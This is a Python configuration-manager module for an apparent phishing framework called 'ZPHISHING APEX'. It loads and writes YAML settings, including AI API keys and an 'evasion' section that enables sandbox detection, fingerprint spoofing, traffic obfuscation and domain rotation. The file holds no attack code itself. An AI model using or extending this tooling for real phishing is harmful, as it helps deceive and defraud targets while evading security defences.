#!/usr/bin/env python3
"""
ZPHISHING APEX — Config Manager
"""

import os
import json
import yaml
from typing import Dict, Optional
from pathlib import Path

class ConfigManager:
    def __init__(self, config_path: str = 'config.yaml'):
        self.config_path = config_path
        self.config = self._load_config()

    def _load_config(self) -> Dict:
        """Load configuration"""
        if os.path.exists(self.config_path):
            with open(self.config_path, 'r') as f:
                return yaml.safe_load(f)
        else:
            return self._create_default_config()

    def _create_default_config(self) -> Dict:
        """Create default configuration"""
        config = {
            'server': {
                'host': '0.0.0.0',
                'port': 8080,
                'debug': False
            },
            'database': {
                'url': os.environ.get('DATABASE_URL', 'sqlite:///zphishing.db')
            },
            'redis': {
                'url': os.environ.get('REDIS_URL', 'redis://localhost:6379/0')
            },
            'ai': {
                'openai_api_key': os.environ.get('OPENAI_API_KEY'),
                'anthropic_api_key': os.environ.get('ANTHROPIC_API_KEY')
            },
            'evasion': {
                'sandbox_detection': True,
                'fingerprint_spoofing': True,
                'traffic_obfuscation': True,
                'domain_rotation': True
            },
            'infrastructure': {
                'auto_scale': False,
                'providers': ['docker', 'kubernetes']
            }
        }

        with open(self.config_path, 'w') as f:
            yaml.dump(config, f, default_flow_style=False)

        return config

    def get(self, key: str, default=None):
        """Get configuration value"""
        keys = key.split('.')
        value = self.config

        for k in keys:
            if isinstance(value, dict):
                value = value.get(k)
            else:
                return default

        return value if value is not None else default

    def set(self, key: str, value):
        """Set configuration value"""
        keys = key.split('.')
        config = self.config

        for k in keys[:-1]:
            if k not in config:
                config[k] = {}
            config = config[k]

        config[keys[-1]] = value

        with open(self.config_path, 'w') as f:
            yaml.dump(self.config, f, default_flow_style=False)
